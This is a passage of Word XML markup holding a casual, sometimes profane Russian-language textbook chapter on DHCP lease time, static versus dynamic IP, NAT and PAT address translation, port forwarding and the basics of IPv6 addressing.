    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Шлюз по умолчанию** (default gateway) — адрес роутера (например, `192.168.1.1`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**DNS-серверы** (например, `8.8.8.8`, `1.1.1.1`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Lease Time** (время аренды) — сколько времени клиент может использовать этот IP (обычно 24 часа)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример настроек</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (вывод `ip addr` на Linux):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2: enp3s0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500</w:t>
        <w:br/>
        <w:t xml:space="preserve">    inet 192.168.1.100/24 brd 192.168.1.255 scope global dynamic enp3s0</w:t>
        <w:br/>
        <w:t xml:space="preserve">       valid_lft 86400sec preferred_lft 86400sec</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">`valid_lft 86400sec` — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>lease time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (86400 секунд = 24 часа).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Lease Time: аренда IP-адреса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lease Time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это время, на которое IP-адрес выдаётся клиенту. После истечения времени клиент должен </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>обновить аренду</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (послать DHCP Request снова) или вернуть IP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем это нужно</w:t>
      </w:r>
      <w:r>
        <w:t>: Если устройство отключилось (ноутбук выключили), его IP освободится через несколько часов, и DHCP-сервер сможет выдать его другому устройству.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типичные значения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Домашний роутер: **24 часа**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Офисная сеть: **8 часов**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кафе/аэропорт: **1-2 часа**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Статический vs Динамический IP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статический IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (static IP):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ты **вручную** прописываешь IP, маску, шлюз, DNS в настройках сетевой карты.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Плюсы**: IP не меняется, удобно для серверов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Минусы**: если ошибёшься — сеть не работает.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Динамический IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (dynamic IP):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DHCP автоматически выдаёт настройки.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Плюсы**: удобно, настраивается за 2 секунды.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Минусы**: IP может измениться (но обычно роутер выдаёт тот же IP при повторном подключении).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать статический IP</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Серверы (чтобы клиенты всегда знали адрес)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Принтеры в офисе</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>NAS (сетевое хранилище)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать динамический IP</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ноутбуки, смартфоны, планшеты (вообще всё, что подключается к разным сетям)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.6.5. NAT (Network Address Translation): как экономить IP-адреса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: IPv4-адресов </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>закончилось</w:t>
      </w:r>
      <w:r>
        <w:t>. Всего их 2³² = ~4.3 миллиарда, но устройств в мире намного больше (смартфоны, IoT, серверы). Как, блять, все эти устройства подключаются к интернету?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NAT (Network Address Translation)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — технология, которая позволяет множеству устройств с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>приватными IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> выходить в интернет через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>один публичный IP</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Приватные IP-адреса: не маршрутизируются в интернете</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RFC 1918</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> определил три диапазона приватных IP-адресов, которые </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не маршрутизируются в интернете</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (роутеры в интернете их отбрасывают):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Диапазон | Маска подсети | Количество адресов | Где используется |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------|---------------|-------------------|------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10.0.0.0 – 10.255.255.255</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | `255.0.0.0` (`/8`) | 16,777,216 | Большие корпоративные сети |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>172.16.0.0 – 172.31.255.255</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | `255.240.0.0` (`/12`) | 1,048,576 | Средние сети |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.0 – 192.168.255.255</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | `255.255.0.0` (`/16`) | 65,536 | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Домашние сети</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (роутеры) |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: У тебя дома роутер с публичным IP `93.184.216.34` (выдал провайдер), а в локальной сети:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Роутер: `192.168.1.1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ноутбук: `192.168.1.100`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Смартфон: `192.168.1.101`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Телевизор: `192.168.1.102`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Все устройства используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>приватные IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, но выходят в интернет через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>один публичный IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> роутера.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Как работает NAT</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сценарий</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты открываешь `google.com` на ноутбуке (IP `192.168.1.100`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаги</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Клиент → Роутер**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ноутбук отправляет пакет:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Source IP: `192.168.1.100:54321` (случайный порт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Destination IP: `142.250.185.46:443` (Google HTTPS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**NAT на роутере**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Роутер **переписывает** Source IP:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Source IP: `93.184.216.34:12345` (публичный IP роутера + новый порт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Destination IP: `142.250.185.46:443`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Роутер сохраняет в **NAT-таблицу**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`192.168.1.100:54321` ↔ `93.184.216.34:12345`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Роутер → Google**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пакет уходит в интернет с адреса `93.184.216.34:12345`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Google → Роутер**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Google отвечает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Source IP: `142.250.185.46:443`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Destination IP: `93.184.216.34:12345`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**NAT на роутере (обратно)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Роутер смотрит в NAT-таблицу: порт `12345` → это `192.168.1.100:54321`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Роутер **переписывает** Destination IP:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Source IP: `142.250.185.46:443`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Destination IP: `192.168.1.100:54321`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Роутер → Клиент**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пакет доходит до ноутбука</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ключевая идея</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Роутер подменяет приватный IP на публичный и запоминает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>соответствие портов</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>PAT (Port Address Translation): NAT на стероидах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Технически то, что описано выше, называется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PAT (Port Address Translation)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NAPT (Network Address Port Translation)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Это расширение NAT, которое использует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>порты</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для различения устройств.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Разница</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**NAT**: один приватный IP → один публичный IP (1:1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**PAT**: множество приватных IP → один публичный IP (N:1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В домашних роутерах используется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PAT</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Проблемы NAT: нельзя подключиться снаружи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: NAT работает только для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>исходящих соединений</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (из локальной сети в интернет). Если кто-то из интернета хочет подключиться к твоему компьютеру (например, для P2P, игрового сервера, VoIP), он не может этого сделать, потому что роутер не знает, кому переслать пакет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Ты хочешь запустить веб-сервер на ноутбуке (`192.168.1.100:8080`). Друг из интернета пытается зайти на `93.184.216.34:8080` (твой публичный IP). Пакет доходит до роутера, но роутер не знает, что делать с портом `8080` → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>отбрасывает пакет</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Port Forwarding (проброс портов)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В настройках роутера прописываешь: порт `8080` → `192.168.1.100:8080`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Теперь все пакеты на `93.184.216.34:8080` идут на твой ноутбук</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**UPnP (Universal Plug and Play)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программа на ноутбуке автоматически просит роутер открыть порт (используется в играх, торрентах)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**DMZ (Demilitarized Zone)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Роутер пересылает **все** входящие пакеты на одно устройство (небезопасно, используется редко)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**VPN**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Соединение через VPN-сервер обходит NAT</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.6.6. IPv6: будущее, которое никак не наступит</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: IPv4-адресов закончилось в 2011 году. NAT — это временный костыль. Настоящее решение — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IPv6</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IPv6 (Internet Protocol version 6)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это новая версия IP-протокола с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>128-битными адресами</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (вместо 32-битных в IPv4).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Сравнение IPv4 vs IPv6</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Параметр | IPv4 | IPv6 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------|------|------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Длина адреса</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 32 бита | 128 бит |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Количество адресов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~4.3 миллиарда (2³²) | ~340 ундециллионов (2¹²⁸) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формат записи</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Десятичные числа: `192.168.1.1` | Шестнадцатеричные группы: `2001:0db8:85a3::8a2e:0370:7334` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нужен ли NAT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Да (из-за нехватки адресов) | Нет (адресов дофига) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Конфигурация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | DHCP | SLAAC (автоконфигурация) или DHCPv6 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Поддержка IPsec</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Опционально | Обязательно (встроенная безопасность) |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Формат IPv6-адреса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">IPv6-адрес состоит из </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>8 групп по 4 шестнадцатеричные цифры</w:t>
      </w:r>
      <w:r>
        <w:t>, разделённых двоеточиями.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`2001:0db8:85a3:0000:0000:8a2e:0370:7334`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`fe80:0000:0000:0000:0202:b3ff:fe1e:8329`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Это пиздец длинно</w:t>
      </w:r>
      <w:r>
        <w:t>, поэтому есть правила сокращения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Удалить ведущие нули** в группах:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
